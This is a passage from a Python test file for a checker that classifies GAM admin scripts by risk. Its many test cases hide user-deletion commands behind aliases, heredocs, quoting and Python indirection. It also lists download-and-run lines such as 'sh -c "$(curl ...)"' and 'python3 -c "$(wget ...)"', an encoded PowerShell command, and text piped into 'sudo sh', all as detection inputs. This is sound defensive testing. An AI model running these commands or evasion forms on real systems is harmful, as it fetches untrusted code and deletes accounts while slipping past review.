    assert text(guard + dangerous, 'go') == g.DESTRUCTIVE
    # spellings the branch reader must not misread (each would hide the delete if it did)
    d, r = 'gam delete user x@example.com', 'gam print users'
    for src, args in (
            (f'MODE=$1\nif [ "$MODE" = go ]; then\n  {r}; else\n  {d}\nfi\n', ['check']),
            (f'MODE=$1\ncase "$MODE" in\n  check)\n    if [ -f x ]; then\n      {r}\n    fi;;\n  go)\n    {d}\n    ;;\nesac\n', ['go']),
            (f'MODE=$1\ncase "$MODE" in\n  go)\n    {r}\n    ;&\n  check)\n    {d}\n    ;;\nesac\n', ['go']),
            (f'MODE=$1\ncase "$MODE" in\n  check) {r} ;; go) {d} ;;\nesac\n', ['go']),
            (f'MODE=$1\nif [[ "$MODE" == "c*" ]]; then\n  {r}\nelse\n  {d}\nfi\n', ['check']),
            (f'MODE=$1\ncase "$MODE" in\n  "c*") {r} ;;\n  *) {d} ;;\nesac\n', ['check']),
            (f'MODE=$1\nD=check\ncase "$MODE" in\n  "$D") {d} ;;\n  *) {r} ;;\nesac\n', ['check']),
            (f'MODE=$1\ncat <<EOF\nif [ "$MODE" = go ]; then\nEOF\n{d}\ncat <<EOF\nfi\nEOF\n', ['check']),
            (f'MODE=$1\n: "${{MODE:=delete}}"\ncase "$MODE" in\n  delete) {d} ;;\n  *) {r} ;;\nesac\n', []),
            (f'[ "$1" = -v ] && {{ shift; }}\nMODE=$1\ncase "$MODE" in\n  go) {d} ;;\n  *) {r} ;;\nesac\n', ['-v', 'go']),
            (f'f() {{\n  if [ "$MODE" = check ]; then\n    {r}\n  else\n    {d}\n  fi\n}}\nf\nMODE=$1\n', ['check']),
            (f'MODE=$1\ncase "$MODE" in\n  check)\n    if [ -f x ]; then {r}; fi;;\n  go)\n    {d}\n    ;;\nesac\n', ['go']),
            (f'MODE=$1\nshopt -s nocasematch\ncase "$MODE" in\n  check) {r} ;;\n  go) {d} ;;\nesac\n', ['GO']),
            (f'MODE=$1\nprintf -v MODE go\nif [ "$MODE" = check ]; then\n  {r}\nelse\n  {d}\nfi\n', ['check']),
            (f'MODE=$1\nbuiltin read MODE\nif [ "$MODE" = check ]; then\n  {r}\nelse\n  {d}\nfi\n', ['check']),
            (f'T=${{2:-none}}\ncase "$T" in\n  none)\n    {d}\n    ;;\n  *) {r} ;;\nesac\n', ['apply', '>', 'log'])):
        assert text(src, *args) == g.DESTRUCTIVE, src
    # unrelated conditions are kept, not guessed
    assert text('MODE=$1\nif [ -f x ]; then\n  gam delete user x@example.com\nfi\n', 'check') == g.DESTRUCTIVE
    # checked on its own, the whole file still counts
    assert g.verdict(checker.check_file(FIXTURES / 'modes_if.sh')) == g.CHANGES


def test_language():
    """A shell script is read as shell even when its text has batch-looking % signs."""
    from pathlib import Path
    pct = "printf '%s|%s\\n' a b\n# notes). Still opens $EDITOR\n"
    assert g.Checker.language(Path('x.sh'), pct) == 'shell'
    assert g.Checker.language(Path('x'), '#!/bin/bash\n' + pct) == 'shell'
    assert g.Checker.language(Path('x'), '#!/usr/bin/env bash\n' + pct) == 'shell'
    assert g.Checker.language(Path(''), 'set X=%Y%\n') == 'batch'  # a paste with no shebang still guesses
    assert g.Checker().check_text('X=" "\ngam print users\n', '<t>', 'shell')  # used to raise IndexError
    found = g.Checker().check_text('#!/bin/bash\n' + pct, '<t>', g.Checker.language(Path('x.sh'), pct))
    assert not any('Still' in f.what for f in found), found


AUDIT_2026_11 = [
    # (script text, language, floor or exact level, 'floor' | 'exact')
    # a # inside a word is code, not a comment
    ('gam info domain\n[ $# -gt 0 ] && gam delete user "$1"', 'shell', g.DESTRUCTIVE, 'floor'),
    ('gam info domain\nif [ $# -eq 1 ]; then gam delete user "$1"; fi', 'shell', g.DESTRUCTIVE, 'floor'),
    ('gam info domain\nn=${#USER}; gam delete user bob@example.com', 'shell', g.DESTRUCTIVE, 'floor'),
    ('gam info domain\nN=$#; gam delete user bob@example.com', 'shell', g.DESTRUCTIVE, 'floor'),
    ('gam info domain\ngam print users#; gam delete user bob@example.com', 'shell', g.DESTRUCTIVE, 'floor'),
    ('gam info domain # comment; gam delete user x@example.com', 'shell', g.READ, 'exact'),
    ("gam info domain\necho '# not a comment'; gam print users", 'shell', g.READ, 'exact'),
    # a comment never continues onto the next line
    ('gam info domain\n# remove the leaver, see ticket \\\ngam delete user bob@example.com', 'shell', g.DESTRUCTIVE, 'floor'),
    ('gam info domain\n# output goes to C:\\GAM\\\ngam delete user bob@example.com', 'shell', g.DESTRUCTIVE, 'floor'),
    ('gam info domain\n# note `\ngam delete user bob@example.com', 'powershell', g.DESTRUCTIVE, 'floor'),
    ('gam print users \\\n  query isSuspended=False', 'shell', g.READ, 'exact'),
    # a # inside a quote the shell knows is not a comment
    ("gam info domain\necho $'it\\'s # x'; gam delete user bob@example.com", 'shell', g.DESTRUCTIVE, 'floor'),
    ('gam info domain\nx=`echo a # b`; gam delete user bob@example.com', 'shell', g.DESTRUCTIVE, 'floor'),
    ('gam info domain\nmsg="first line\nsecond # line"; gam delete user bob@example.com', 'shell', g.UNKNOWN, 'floor'),
    ('gam info domain\nWrite-Host “a # b”; gam delete user bob@example.com', 'powershell', g.DESTRUCTIVE, 'floor'),
    ('gam info domain\necho "it\'s fine" # gam delete user x\ngam print users # done', 'shell', g.READ, 'exact'),
    # GAM batch files run one command per physical line
    ('gam print users \\\ngam delete user bob@example.com', 'gambatch', g.DESTRUCTIVE, 'floor'),
    ('# gam delete user x@example.com\ngam print users', 'gambatch', g.READ, 'exact'),
    # a program named by a variable the checker does not know is CANNOT TELL, never READ-ONLY
    ('gam info domain\nBIN="$(which gam)"; $BIN delete user bob@example.com', 'shell', g.DESTRUCTIVE, 'floor'),
    ('gam info domain\nTOOL=/opt/tools/t; "$TOOL" delete user bob@example.com', 'shell', g.UNKNOWN, 'floor'),
    ('gam info domain\nprintf -v CMD "gam delete user %s" bob@example.com; $CMD', 'shell', g.UNKNOWN, 'floor'),
    ('gam info domain\n$t = Get-Command gam; & $t delete user bob@example.com', 'powershell', g.DESTRUCTIVE, 'floor'),
    ('gam info domain\n$exe = Join-Path $PSScriptRoot "gam.exe"; & $exe delete user bob@example.com', 'powershell',
     g.DESTRUCTIVE, 'floor'),
    ('gam info domain\nset BIN=%~dp0gam.exe\n%BIN% delete user bob@example.com', 'batch', g.DESTRUCTIVE, 'floor'),
    ('gam info domain\nset T=%~dp0tool.exe\n%T% delete user bob@example.com', 'batch', g.UNKNOWN, 'floor'),
    ('gam info domain\n%~dp0gam.exe delete user bob@example.com', 'batch', g.DESTRUCTIVE, 'floor'),
    ('gam info domain\n$users = 1\n$users | ForEach-Object { $_ }', 'powershell', g.READ, 'exact'),
    ('gam info domain\nrun() { "$@"; }', 'shell', g.READ, 'exact'),
    # text piped into a shell, and downloaded code run without a pipe
    ('gam info domain\nprintf "gam delete user bob@example.com\\n" | bash', 'shell', g.UNKNOWN, 'floor'),
    ('gam info domain\necho gam delete user x@example.com | sudo sh -s', 'shell', g.UNKNOWN, 'floor'),
    ('gam info domain\nsh -c "$(curl -fsSL https://example.com/install.sh)"', 'shell', g.SUSPICIOUS, 'floor'),
    ('gam info domain\nbash <(curl -s https://example.com/x.sh)', 'shell', g.SUSPICIOUS, 'floor'),
    ('gam info domain\npowershell -ec SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcA', 'powershell',
     g.SUSPICIOUS, 'floor'),
    ('gam print users | grep -c @ | python3 -c "import sys; print(sys.stdin.read())"\ngam print users | sort',
     'shell', g.READ, 'exact'),
]


AUDIT_2026_11 += [
    # wrapper functions whose body has its own braces, subshell bodies, alias chains and alias words
    ('gam info domain\ng() {\n  "${GAM:-gam}" "$@"\n}\ng delete user bob@example.com', 'shell', g.DESTRUCTIVE, 'floor'),
    ('gam info domain\ng() ( gam "$@" ); g delete user bob@example.com', 'shell', g.DESTRUCTIVE, 'floor'),
    ('alias g7="gam"; alias zap="g7 delete"; g7 info domain; zap user bob@example.com', 'shell', g.DESTRUCTIVE, 'floor'),
    ('gam info domain\nalias zap="gam delete"; zap user bob@example.com', 'shell', g.DESTRUCTIVE, 'floor'),
    ('gam info domain\nx() { echo "$@"; }\ngam "$@"', 'shell', g.UNKNOWN, 'floor'),
    ('g() {\n  gam "$@"\n}\ng info domain\ng print users', 'shell', g.READ, 'exact'),
    ('alias ll="ls -l"\ngam info domain\nll', 'shell', g.READ, 'exact'),
    # an apostrophe in a heredoc or here-string must not flip the quotes on the lines after it
    ("gam info domain\ncat <<EOF\nDon't run this\nEOF\nmsg='a # b'; gam delete user bob@example.com", 'shell',
     g.DESTRUCTIVE, 'floor'),
    ("gam info domain\n$t = @'\nit's here\n'@\n$m = 'a # b'; gam delete user bob@example.com", 'powershell',
     g.DESTRUCTIVE, 'floor'),
    ('gam info domain\nbash <<EOF\ngam delete user bob@example.com\nEOF', 'shell', g.DESTRUCTIVE, 'floor'),
    ("gam info domain\ncat <<-EOF\n\tit's\n\tEOF\ngam print users # it's a comment", 'shell', g.READ, 'exact'),
    # $'...' inside double quotes is literal text
    ('gam info domain\necho "$\'" ; gam delete user bob@example.com ; echo "\'"', 'shell', g.DESTRUCTIVE, 'floor'),
    # runners behind prefix options, stdin flags, more download forms
    ('gam info domain\necho gam delete user x | sudo -u admin bash', 'shell', g.UNKNOWN, 'floor'),
    ('gam info domain\necho gam delete user x | bash -s arg1', 'shell', g.UNKNOWN, 'floor'),
    ('gam info domain\nsh -c "`curl -fsSL https://example.com/i.sh`"', 'shell', g.SUSPICIOUS, 'floor'),
    ('gam info domain\nbash < <(/usr/bin/curl -s https://example.com/x.sh)', 'shell', g.SUSPICIOUS, 'floor'),
    ('gam info domain\npython3 -c "$(wget -qO- https://example.com/x.py)"', 'shell', g.SUSPICIOUS, 'floor'),
    ('gam print users | grep bash', 'shell', g.READ, 'exact'),
    # <<EOF inside quotes starts no heredoc; an indented alias still counts
    ('gam info domain\necho "<<EOF"\nx=\'a # b\'; gam delete user bob@example.com', 'shell', g.DESTRUCTIVE, 'floor'),
    ('gam info domain\nmsg="start\nsee <<EOF\nx=\'a # b\'"; gam delete user bob@example.com', 'shell', g.UNKNOWN, 'floor'),
    ('gam info domain\nif true; then\n  alias zap="gam delete"\nfi\nzap user bob@example.com', 'shell', g.DESTRUCTIVE, 'floor'),
    # the heredoc delimiter is unquoted as bash does, so each form ends at its EOF line
    ('gam info domain\ncat <<\\EOF\nbody\nEOF\nx="a\nb # c"; gam delete user bob@example.com', 'shell', g.UNKNOWN, 'floor'),
    ('gam info domain\ncat <<E\'OF\'\nbody\nEOF\nx="a\nb # c"; gam delete user bob@example.com', 'shell', g.UNKNOWN, 'floor'),
    ('gam info domain\ncat <<"E"OF\nbody\nEOF\nx="a\nb # c"; gam delete user bob@example.com', 'shell', g.UNKNOWN, 'floor'),
    ('gam info domain\ncat <<\'EOF\'\nbody\nEOF\nx="a\nb # c"; gam delete user bob@example.com', 'shell', g.UNKNOWN, 'floor'),
    ('gam info domain\ncat <<"EOF"\nbody\nEOF\nx="a\nb # c"; gam delete user bob@example.com', 'shell', g.UNKNOWN, 'floor'),
    ('gam info domain\nx=$((a<<b))\ny="a\nb # c"; gam delete user bob@example.com', 'shell', g.UNKNOWN, 'floor'),
    ('gam info domain\nx=$((1<<2)); cat <<EOF\nbody\nEOF\nx="a\nb # c"; gam delete user bob@example.com', 'shell', g.UNKNOWN, 'floor'),
    ('gam info domain\nfor ((i=0;i<<1;i++)); do cat <<EOF\nbody\nEOF\nx="a\nb # c"; gam delete user bob@example.com', 'shell', g.UNKNOWN, 'floor'),
    ('gam info domain\ncat <<E`x`\nE\nit\'s\nE`x`\ngam delete user bob@example.com', 'shell', g.DESTRUCTIVE, 'floor'),
    # gamx is GAM7 under another name (CHK-20); todrive as a query value is not the upload option (CHK-21)
    ('gamx info domain\ngamx delete user bob@example.com', 'shell', g.DESTRUCTIVE, 'floor'),
    ('gam print users query "todrive"', 'shell', g.READ, 'exact'),
    ('gam print users todrive', 'shell', g.CHANGES, 'exact'),
    ('gam print users fields todrive', 'shell', g.CHANGES, 'exact'),
    ('gam info domain\npython3 -Wcm - <<\'EOF\'\nimport subprocess\nsubprocess.run(["gam", "delete", "user", "bob@example.com"])\nEOF', 'shell', g.UNKNOWN, 'floor'),
    ('gam print users query "isSuspended=False" todrive', 'shell', g.CHANGES, 'exact'),
    # CHK-16: python3 - <<'EOF' runs the heredoc as Python, so the Python reader reads it
    ('gam info domain\npython3 - <<\'EOF\'\nimport subprocess\nsubprocess.run(["gam", "delete", "user", "bob@example.com"])\nEOF', 'shell', g.DESTRUCTIVE, 'floor'),
    ('gam info domain\nsudo /usr/bin/python3 -u <<EOF\nimport subprocess\nsubprocess.run(["gam", "delete", "user", "bob@example.com"])\nEOF', 'shell', g.DESTRUCTIVE, 'floor'),
    ('gam info domain\npython3 - <<\'EOF\'\nimport subprocess\nsubprocess.run(["gam", "print", "users"])  # it\'s fine\nEOF\ngam print users', 'shell', g.READ, 'exact'),
    # an unquoted <<EOF body still runs $(...) in the shell; only the heredoc that feeds python is read as Python
    ('gam info domain\npython3 - <<EOF\nprint("$(gam delete user bob@example.com)")\nEOF', 'shell', g.UNKNOWN, 'floor'),
    ('gam info domain\npython3 - <<EOF\n$(gam delete user bob@example.com)\nEOF', 'shell', g.DESTRUCTIVE, 'floor'),
    ('gam info domain\npython3 -mjson.tool <<EOF\n{"a": "$(gam delete user bob@example.com)"}\nEOF', 'shell', g.UNKNOWN, 'floor'),
    ('gam info domain\npython3 - <<\'A\'; cat <<\'B\'\nimport subprocess\nsubprocess.run(["gam", "delete", "user", "bob@example.com"])\nA\ngam print users\nB', 'shell', g.DESTRUCTIVE, 'floor'),
    ('gam info domain\ncat <<\'A\'; python3 - <<\'B\'\nit\'s text\nA\nimport subprocess\nsubprocess.run(["gam", "delete", "user", "bob@example.com"])\nB', 'shell', g.DESTRUCTIVE, 'floor'),
    # python -x skips a line and a later < replaces the heredoc: CANNOT TELL; a pipe is still reported beside it
    ('gam info domain\npython3 -x - <<\'EOF\'\n"""\nimport subprocess\nsubprocess.run(["gam", "delete", "user", "bob@example.com"])\nEOF', 'shell', g.UNKNOWN, 'floor'),
    ('gam info domain\npython3 - <<\'EOF\' <prog.py\nprint(1)\nEOF', 'shell', g.UNKNOWN, 'floor'),
    ('gam info domain\ncat x | python3 - <<\'EOF\'\nimport subprocess\nsubprocess.run(["gam", "delete", "user", "bob@example.com"])\nEOF', 'shell', g.DESTRUCTIVE, 'floor'),
    # python behind a prefix word's own options or a path, and a heredoc on a continuation line, are still read as Python
    ('gam info domain\ntimeout 60 python3 - <<\'EOF\'\nimport subprocess\nsubprocess.run(["gam", "delete", "user", "bob@example.com"])\nEOF', 'shell', g.DESTRUCTIVE, 'floor'),
    ('gam info domain\nsudo -u svc python3 - <<\'EOF\'\nimport subprocess\nsubprocess.run(["gam", "delete", "user", "bob@example.com"])\nEOF', 'shell', g.DESTRUCTIVE, 'floor'),
    ('gam info domain\n/usr/bin/env python3 - <<\'EOF\'\nimport subprocess\nsubprocess.run(["gam", "delete", "user", "bob@example.com"])\nEOF', 'shell', g.DESTRUCTIVE, 'floor'),
    ('gam info domain\npython3 - \\\n  <<\'EOF\'\nimport subprocess\nsubprocess.run(["gam", "delete", "user", "bob@example.com"])\nEOF', 'shell', g.DESTRUCTIVE, 'floor'),
    ('gam info domain\npython3 \\\n  - <<\'EOF\'\nimport subprocess\nsubprocess.run(["gam", "delete", "user", "bob@example.com"])\nEOF', 'shell', g.DESTRUCTIVE, 'floor'),
    ('gam info domain\n$(command -v python3) - <<\'EOF\'\nimport subprocess\nsubprocess.run(["gam", "delete", "user", "bob@example.com"])\nEOF', 'shell', g.UNKNOWN, 'floor'),
    ('gam info domain\n`which python3` - <<\'EOF\'\nimport subprocess\nsubprocess.run(["gam", "delete", "user", "bob@example.com"])\nEOF', 'shell', g.UNKNOWN, 'floor'),
    ('gam info domain\n$(which python3) <<\'EOF\'\nimport subprocess\nsubprocess.run(["gam", "delete", "user", "bob@example.com"])\nEOF', 'shell', g.UNKNOWN, 'floor'),
    ('gam info domain\n`which sudo` tee x <<EOF\nhello\nEOF\n`date` <<EOF\nhi\nEOF', 'shell', g.READ, 'exact'),
    ('gam info domain\n"$(which python3)" - <<\'EOF\'\nimport subprocess\nsubprocess.run(["gam", "delete", "user", "bob@example.com"])\nEOF', 'shell', g.UNKNOWN, 'floor'),
    ('gam info domain\n"`which python3`" <<\'EOF\'\nimport subprocess\nsubprocess.run(["gam", "delete", "user", "bob@example.com"])\nEOF', 'shell', g.UNKNOWN, 'floor'),
    ('gam info domain\n`true` python3 - <<\'EOF\'\nimport subprocess\nsubprocess.run(["gam", "delete", "user", "bob@example.com"])\nEOF', 'shell', g.UNKNOWN, 'floor'),
    ('gam info domain\n`date` `which python3` - <<\'EOF\'\nimport subprocess\nsubprocess.run(["gam", "delete", "user", "bob@example.com"])\nEOF', 'shell', g.UNKNOWN, 'floor'),
    ('gam info domain\n$(printf python3; echo $(true)) - <<\'EOF\'\nimport subprocess\nsubprocess.run(["gam", "delete", "user", "bob@example.com"])\nEOF', 'shell', g.UNKNOWN, 'floor'),
    ('gam info domain\n$(command -v $INTERP) - <<\'EOF\'\nimport subprocess\nsubprocess.run(["gam", "delete", "user", "bob@example.com"])\nEOF', 'shell', g.UNKNOWN, 'floor'),
    ('gam info domain\n$(which sudo) tee x <<EOF\nhello\nEOF\nx=$(date); cat <<EOF\nhi\nEOF', 'shell', g.READ, 'exact'),
    ('gam info domain\nx="a \\\n b"; python3 - <<\'EOF\'\nimport subprocess\nsubprocess.run(["gam", "delete", "user", "bob@example.com"])\nEOF', 'shell', g.DESTRUCTIVE, 'floor'),
    # bash joins backslash-newline first, so a heredoc body starts after the whole logical line
    ('gam info domain\ncat <<\'A\' \\\n; python3 - <<\'B\'\na\nA\nimport subprocess\nsubprocess.run(["gam", "delete", "user", "bob@example.com"])\nB', 'shell', g.DESTRUCTIVE, 'floor'),
    # a heredoc that never finds its end marker was probably misread, so the script cannot be read as safe
    ('gam info domain\ncat <<E`x y`\nbody\nE`x y`\nx="a\nb # c"; gam print users', 'shell', g.UNKNOWN, 'floor'),
    ('gam info domain\ncat <<E`x`\nE\nx="a\nE`x`\nmsg=\'a # b\'; gam delete user bob@example.com', 'shell', g.DESTRUCTIVE, 'floor'),
    ('gam info domain\nx=`cat <<EOF`\nbody\nEOF\nx="a\nb # c"; gam delete user bob@example.com', 'shell', g.UNKNOWN, 'floor'),
    ('gam info domain\ncat <<A <<B\nit\'s\nA\nbody\nB\nx="a\nb # c"; gam delete user bob@example.com', 'shell', g.UNKNOWN, 'floor'),
    # Python run functions reached by another name, and every os.exec/spawn form
    ('import subprocess, os, functools, asyncio\nsubprocess.run(["gam", "info", "domain"])\nrun = subprocess.run\nrun(["gam", "delete", "user", "b@example.com"])', 'python', g.DESTRUCTIVE, 'floor'),
    ('import subprocess, os, functools, asyncio\nsubprocess.run(["gam", "info", "domain"])\nrun = functools.partial(subprocess.run, check=True)\nrun(["gam", "delete", "user", "b@example.com"])',
     'python', g.DESTRUCTIVE, 'floor'),
    ('import subprocess, os, functools, asyncio\nsubprocess.run(["gam", "info", "domain"])\ngetattr(subprocess, "run")(["gam", "delete", "user", "b@example.com"])', 'python', g.DESTRUCTIVE, 'floor'),
    ('import subprocess, os, functools, asyncio\nsubprocess.run(["gam", "info", "domain"])\nos.execlp("gam", "gam", "delete", "user", "b@example.com")', 'python', g.DESTRUCTIVE, 'floor'),
    ('from subprocess import *\nrun(["gam", "info", "domain"])\nrun(["gam", "delete", "user", "b@example.com"])',
     'python', g.DESTRUCTIVE, 'floor'),
    ('import subprocess, os, functools, asyncio\nsubprocess.run(["gam", "info", "domain"])\nos.execv("/usr/bin/gam", ["gam", "delete", "user", "b@example.com"])', 'python', g.DESTRUCTIVE, 'floor'),
    ('import subprocess, os, functools, asyncio\nsubprocess.run(["gam", "info", "domain"])\nasyncio.create_subprocess_exec("gam", "delete", "user", "b@example.com")', 'python', g.DESTRUCTIVE, 'floor'),
    ('import subprocess, os, functools, asyncio\nsubprocess.run(["gam", "info", "domain"])\nCMDS = ["gam", "delete", "user", "b@example.com"]', 'python', g.DESTRUCTIVE, 'floor'),
    ('import subprocess, os, functools, asyncio\nsubprocess.run(["gam", "info", "domain"])\nrun = subprocess.run\nrun(["gam", "print", "users"])\nchoices = ["print", "info"]', 'python', g.READ, 'exact'),
    # the exec path is what runs; partials that bind arguments; a later binding beats an import
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nos.execv("/usr/bin/gam", ["x", "delete", "user", "b@example.com"])', 'python', g.DESTRUCTIVE, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nrun = functools.partial(os.execlp, "gam", "gam", "delete")\nrun("user", "b@example.com")',
     'python', g.UNKNOWN, 'floor'),
    ('import subprocess, os as run\nsubprocess.run(["gam", "info", "domain"])\nrun = subprocess.run\nrun(["gam", "delete", "user", "b@example.com"])', 'python', g.DESTRUCTIVE, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nos.execv(sys.argv[1], ["gam", "print", "users"])', 'python', g.UNKNOWN, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nos.execvp("gam", ["gam", "print", "users"])', 'python', g.READ, 'exact'),
    # an exec path built at runtime, partial bindings carried through a chain of names, assignments that disagree
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nos.execv(f"{sys.argv[1]}", ["gam", "print", "users"])', 'python', g.UNKNOWN, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nos.execv("{}".format(sys.argv[1]), ["gam", "print", "users"])', 'python', g.UNKNOWN, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nos.execv(f"/opt/{sys.argv[1]}/gam", ["x", "delete", "user", "b@example.com"])', 'python', g.DESTRUCTIVE, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\na = functools.partial(os.execlp, "gam", "gam", "delete")\nb = a\nc = b\nc("user", "b@example.com")', 'python', g.UNKNOWN, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nrun = subprocess.run\nrun = functools.partial(os.execlp, "gam", "gam", "delete")\nrun("user", "b@example.com")', 'python', g.UNKNOWN, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nrun = subprocess.run\nrun = os.execlp\nrun("gam", "gam", "print", "users")', 'python', g.UNKNOWN, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\na = b\nb = a\nb = subprocess.run\na(["gam", "delete", "user", "b@example.com"])', 'python', g.DESTRUCTIVE, 'floor'),
    # a lookup cut short or still in progress never reads as safe: memo, self-rebinding partials, global, long chains
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nt = os.execlp\nx7 = t\nx1 = x2\nx2 = x3\nx3 = x4\nx4 = x5\nx5 = x6\nx6 = x7\na = x1\na = t\na("gam", "gam", "delete", "user", "b@example.com")', 'python', g.DESTRUCTIVE, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nif len(sys.argv) > 1:\n    run = os.execlp\nrun = functools.partial(run, "gam", "gam", "delete")\nrun("user", "b@example.com")', 'python', g.UNKNOWN, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nrun = os.execlp\nrun = functools.partial(run, "gam", "gam", "delete")\nrun("user", "b@example.com")', 'python', g.UNKNOWN, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nrun = os.execlp\ndef main():\n    global run\n    run = functools.partial(run, "gam", "gam", "delete")\n    run("user", "b@example.com")\nmain()', 'python', g.UNKNOWN, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nx0 = x1\nx1 = x2\nx2 = x3\nx3 = x4\nx4 = x5\nx5 = x6\nx6 = x7\nx7 = x8\nx8 = x9\nx9 = os.execlp\nx0("gam", "gam", "delete", "user", "b@example.com")', 'python', g.DESTRUCTIVE, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\n' + ''.join(f'x{i} = x{i + 1}\n' for i in range(250)) + 'x250 = os.execlp\nx0("gam", "gam", "delete", "user", "b@example.com")', 'python', g.UNKNOWN, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nos.execv(f"/opt/{sys.argv[1]}/g" + "am", ["x", "delete", "user", "b@example.com"])', 'python', g.DESTRUCTIVE, 'floor'),
    # a name being resolved reads as its import; closures, nonlocal, and a partial called where it is built
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nfrom os import execlp as run\nrun = functools.partial(run, "gam", "gam", "delete")\nrun("user", "b@example.com")', 'python', g.UNKNOWN, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nfrom subprocess import run\nrun = functools.partial(run, executable="/usr/local/bin/gam")\nrun(["x", "delete", "user", "b@example.com"])', 'python', g.UNKNOWN, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nfrom os import *\nexeclp = functools.partial(execlp, "gam", "gam", "delete")\nexeclp("user", "b@example.com")', 'python', g.UNKNOWN, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nfrom os import execlp as run\ndef main():\n    global run\n    run = functools.partial(run, "gam", "gam", "delete")\n    run("user", "b@example.com")\nmain()', 'python', g.UNKNOWN, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nimport subprocess as sp\nsp = functools.partial(sp.run, executable="/usr/local/bin/gam")\nsp(["x", "delete", "user", "b@example.com"])', 'python', g.UNKNOWN, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\ndef outer():\n    run = subprocess.run\n    def inner():\n        nonlocal run\n        run = functools.partial(run, executable="/usr/local/bin/gam")\n        run(["x", "delete", "user", "b@example.com"])\n    inner()\nouter()', 'python', g.UNKNOWN, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nf = lambda: functools.partial(os.execlp, "gam", "gam", "delete")("user", "b@example.com")\nf()', 'python', g.UNKNOWN, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nos = os.execlp\nos("gam", "gam", "delete", "user", sys.argv[1])', 'python', g.DESTRUCTIVE, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nfrom subprocess import run\nif len(sys.argv) > 2:\n    run = functools.partial(run, shell=True)\nrun("gam delete user " + sys.argv[1])', 'python', g.UNKNOWN, 'floor'),
    # a parameter, loop target or global in an inner function is never read as an outer or module constant
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\ndef outer():\n    verb = "info"\n    def inner():\n        global verb\n        verb = "delete"\n        subprocess.run(["gam", verb, "user", "b@example.com"])\n    inner()\nouter()', 'python', g.DESTRUCTIVE, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\ndef outer():\n    verb = "info"\n    def inner(verb):\n        subprocess.run(["gam", verb, "user", "b@example.com"])\n    inner("delete")\nouter()', 'python', g.UNKNOWN, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\ndef outer():\n    prog = "/bin/echo"\n    def inner(prog):\n        subprocess.run([prog, "delete", "user", "b@example.com"])\n    inner("gam")\nouter()', 'python', g.UNKNOWN, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nverb = "info"\ndef inner(verb):\n    subprocess.run(["gam", verb, "user", "b@example.com"])\ninner("delete")', 'python', g.UNKNOWN, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nverb = "info"\ndef f():\n    for verb in ("delete",):\n        subprocess.run(["gam", verb, "user", "b@example.com"])\nf()', 'python', g.UNKNOWN, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nverb = "info"\nf = lambda verb: subprocess.run(["gam", verb, "user", "b@example.com"])\nf("delete")', 'python', g.UNKNOWN, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\np = functools.partial(functools.partial(subprocess.run, shell=True), "gam " + "delete" + " user b@example.com")\np()', 'python', g.UNKNOWN, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nfunctools.partial(functools.partial(subprocess.run, shell=True), "gam delete user " + sys.argv[1])()', 'python', g.UNKNOWN, 'floor'),
    # a parameter or loop variable says nothing about which function a name holds: the run lookup reads past it
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nex = os.execlp\ndef f(ex):\n    ex("gam", "gam", "delete", "user", sys.argv[1])\nf(ex)', 'python', g.DESTRUCTIVE, 'floor'),
    ('import subprocess, os, sys, functools\nsubprocess.run(["gam", "info", "domain"])\nrun = subprocess.run\ndef g(run, *args):\n    run(["gam", *args])\ng(run, "delete", "user", sys.argv[1])', 'python', g.DESTRUCTIVE, 'floor'),
